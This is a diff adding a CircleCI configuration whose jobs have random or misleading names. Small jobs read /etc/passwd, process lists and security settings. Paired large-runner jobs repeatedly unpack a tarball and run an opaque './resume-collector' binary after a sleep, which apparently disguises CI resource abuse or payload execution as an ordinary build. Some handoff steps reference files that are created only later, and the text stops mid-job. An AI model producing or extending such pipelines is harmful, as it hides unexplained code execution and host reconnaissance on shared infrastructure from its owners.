@@ -1,0 +1,1631 @@
+version: 2.1
+
+jobs:
+  Invalid-Message:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: week 40 flagging
+          command: |
+            mkdir -p /tmp/_src
+            set +o pipefail 2>/dev/null; for((i=1;i<=10000;i++)); do echo "$((i*31)) $((i*17))"; done > /tmp/_src/BOG_MOOR; true
+            wc -c /tmp/_src/BOG_MOOR; sha1sum /tmp/_src/BOG_MOOR
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'BOG_MOOR'
+  v7-edge4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/BOG_MOOR 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  table-2021-w04:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: 4k Source Render v7
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; cat /etc/shells|awk -F "/" '{print $NF}'|wc -l; true ; } > /tmp/_src/v_50037
+            wc -c /tmp/_src/v_50037; sha1sum /tmp/_src/v_50037
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'v_50037'
+  brodcast:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/v_50037 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  expect_window_fast:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Seriously inform the reviewers this time
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; grep -F -C 2 sync /etc/passwd | sort | head -n 3; true ; } > /tmp/_src/dream.log.1
+            wc -c /tmp/_src/dream.log.1; sha1sum /tmp/_src/dream.log.1
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'dream.log.1'
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/dream.log.1 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  bigPawn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Randomise the manifest file after tea
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; echo -n "that's all folks" | tr ' ' '\n' | sort; true ; } > /tmp/_src/dc8e5b01639
+            wc -c /tmp/_src/dc8e5b01639; sha1sum /tmp/_src/dc8e5b01639
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'dc8e5b01639'
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/2db53c106 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  widget-noon-apple:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: snapshot workers first
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 3 -type f -newer /etc/passwd -exec ls -l {} ";" 2>/dev/null|sed 's|.*/||'|sort -u; true ; } > /tmp/_src/scratch-90916969
+            wc -c /tmp/_src/scratch-90916969; sha1sum /tmp/_src/scratch-90916969
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'scratch-90916969'
+  t-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/scratch-90916969 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  COMMAND516:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: For safety snapshot the metadata catalog
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; ls -S | awk '{print length, $0}' | sort -n | tail -3; true ; } > /tmp/_src/silver
+            wc -c /tmp/_src/silver; sha1sum /tmp/_src/silver
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'silver'
+  hyperion-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/silver 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  d2uv7j:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Retry maintenance mode or flush nightly window
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; ps -eF|head -5; true ; } > /tmp/_src/marKetgUeStMaPPeR
+            wc -c /tmp/_src/marKetgUeStMaPPeR; sha1sum /tmp/_src/marKetgUeStMaPPeR
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'marKetgUeStMaPPeR'
+  cook-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/marKetgUeStMaPPeR 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  asset_sys:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: incubating test tubes in background
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; ps -e; true ; } > /tmp/_src/mothChromeWillowSprite
+            wc -c /tmp/_src/mothChromeWillowSprite; sha1sum /tmp/_src/mothChromeWillowSprite
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'mothChromeWillowSprite'
+  Validate_Tests1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/mothChromeWillowSprite 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  v17:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Scan inventory two per cart
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom of=${TMPDIR:-/tmp}/row_guest.md bs=64 count=2 2>/dev/null && wc -c ${TMPDIR:-/tmp}/row_guest.md; true ; } > /tmp/_src/GLACIER_SAVANNA_CANVAS
+            wc -c /tmp/_src/GLACIER_SAVANNA_CANVAS; sha1sum /tmp/_src/GLACIER_SAVANNA_CANVAS
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'GLACIER_SAVANNA_CANVAS'
+  rocket:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/GLACIER_SAVANNA_CANVAS 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  cfg_StorePromise:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Perform a routine reset on the rack units
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; awk -F':' '$3 >= 1000 { print $6 }' /etc/passwd | nl; true ; } > /tmp/_src/ORD23839
+            wc -c /tmp/_src/ORD23839; sha1sum /tmp/_src/ORD23839
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'ORD23839'
+  v4-ga:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/ORD23839 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  dev28-ap:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Non negotiable linking
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 3 -type f -name "*lock*" -exec wc -l {} \; 2>/dev/null | sort -r; true ; } > /tmp/_src/kernelShardTitanPulse
+            wc -c /tmp/_src/kernelShardTitanPulse; sha1sum /tmp/_src/kernelShardTitanPulse
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'kernelShardTitanPulse'
+  fix-5451:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/kernelShardTitanPulse 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  logIterateCb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Enchant the runbook
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 1 -not -name 'pts' -size 0 -exec ls -ld {} +; true ; } > /tmp/_src/audit-cd0703.log
+            wc -c /tmp/_src/audit-cd0703.log; sha1sum /tmp/_src/audit-cd0703.log
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'audit-cd0703.log'
+  biuld:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/audit-cd0703.log 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  inactiveYes:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Collect the access cards by friday
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; touch "/var/tmp/pan5.txt" && chmod 755 "/var/tmp/pan5.txt" && stat -c %a "/var/tmp/pan5.txt"; true ; } > /tmp/_src/v0.12.18
+            wc -c /tmp/_src/v0.12.18; sha1sum /tmp/_src/v0.12.18
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'v0.12.18'
+  assemble-staging-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/v0.12.18 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  skipEmailTaxAlias:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: tidy up live
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; getent group | cut -d: -f3 | awk '{printf "%05d\n", $1}' | rev | wc -l; true ; } > /tmp/_src/tealcobaltparserbog
+            wc -c /tmp/_src/tealcobaltparserbog; sha1sum /tmp/_src/tealcobaltparserbog
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'tealcobaltparserbog'
+  full-send:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/2db53c106 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  yY:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: MirrorReleaseZip
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; for entry in {6..1}; do sleep 0.1;echo $entry; done|head -n 3; true ; } > /tmp/_src/MUON_MARKET_NORTH
+            wc -c /tmp/_src/MUON_MARKET_NORTH; sha1sum /tmp/_src/MUON_MARKET_NORTH
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'MUON_MARKET_NORTH'
+  artifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/MUON_MARKET_NORTH 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  seed-length:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Codename Bison
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; seq 133 | awk '{print $1, $1*$1}' | tail --lines=3; true ; } > /tmp/_src/a7dmyf3w3z
+            wc -c /tmp/_src/a7dmyf3w3z; sha1sum /tmp/_src/a7dmyf3w3z
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'a7dmyf3w3z'
+  java17-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/2db53c106 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  reduce_proxy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: chillBufferSolution
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; echo -n "release notes ready" | sha224sum; true ; } > /tmp/_src/VID_61443
+            wc -c /tmp/_src/VID_61443; sha1sum /tmp/_src/VID_61443
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'VID_61443'
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/VID_61443 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  OMGX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Quarterly charge
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; ln -sf /etc/passwd "/dev/shm/library.tutorial.pear.dat" && readlink -f "/dev/shm/library.tutorial.pear.dat"; true ; } > /tmp/_src/SKU69718
+            wc -c /tmp/_src/SKU69718; sha1sum /tmp/_src/SKU69718
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'SKU69718'
+  dotnet8-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/SKU69718 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  fuse_zulu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Visa paperwork is ready
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; grep -RI umask /etc/security 2>/dev/null | nl | head -n8; true ; } > /tmp/_src/blake_ac894d900
+            wc -c /tmp/_src/blake_ac894d900; sha1sum /tmp/_src/blake_ac894d900
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'blake_ac894d900'
+  Package_Pipeline4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/2db53c106 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  Mount-PointerProperty:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: PEEK teacher model
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; printf '%s\n' papaya plum pear cherry > /tmp/lib3.dat && wc -l /tmp/lib3.dat; true ; } > /tmp/_src/srccfg
+            wc -c /tmp/_src/srccfg; sha1sum /tmp/_src/srccfg
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'srccfg'
+  wen-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/srccfg 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  weeshsoungx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: On call will be notified
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; for num in papaya grape cherry lemon fig plum; do printf '%-8s %d\n' "$num" ${#num}; done | sort; true ; } > /tmp/_src/bundle.tone.harbor.glacier.wave
+            wc -c /tmp/_src/bundle.tone.harbor.glacier.wave; sha1sum /tmp/_src/bundle.tone.harbor.glacier.wave
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'bundle.tone.harbor.glacier.wave'
+  API-683:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/bundle.tone.harbor.glacier.wave 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  p2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: NEEDS REVIEW export
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,grape,14,70.29\n2,fig,9,53.68\n3,banana,18,20.59\n4,kiwi,11,87.84\n' >"/dev/shm/strategy-1.dat" && awk -F, 'NR>1' "/dev/shm/strategy-1.dat" | wc -l; true ; } > /tmp/_src/1F5
+            wc -c /tmp/_src/1F5; sha1sum /tmp/_src/1F5
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - '1F5'
+  sirius-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/1F5 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  peekTextAI:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: After the duplicate photos settle bail out
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 2 -type d -name "*random" -exec du -sh {} ";" 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/_src/2db53c106
+            wc -c /tmp/_src/2db53c106; sha1sum /tmp/_src/2db53c106
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - '2db53c106'
+  ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/2db53c106 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  accentOrchid:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Team looped in at last
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; echo -n 'snake_case_name' | sha224sum; true ; } > /tmp/_src/tundragammaridge
+            wc -c /tmp/_src/tundragammaridge; sha1sum /tmp/_src/tundragammaridge
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'tundragammaridge'
+  ruby3-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/tundragammaridge 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  ray-provider-button-vertex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Last preview before release
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -newer /etc/passwd -exec ls -ld {} \; 2>/dev/null | nl; true ; } > /tmp/_src/garden.zinc.quick.polar
+            wc -c /tmp/_src/garden.zinc.quick.polar; sha1sum /tmp/_src/garden.zinc.quick.polar
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'garden.zinc.quick.polar'
+  sirius-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/garden.zinc.quick.polar 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  queue-latest-full:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: notification scope all
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; ls -l -p /etc/security | sort -rk5 | head -3; true ; } > /tmp/_src/b1s0n
+            wc -c /tmp/_src/b1s0n; sha1sum /tmp/_src/b1s0n
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'b1s0n'
+  titan2-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
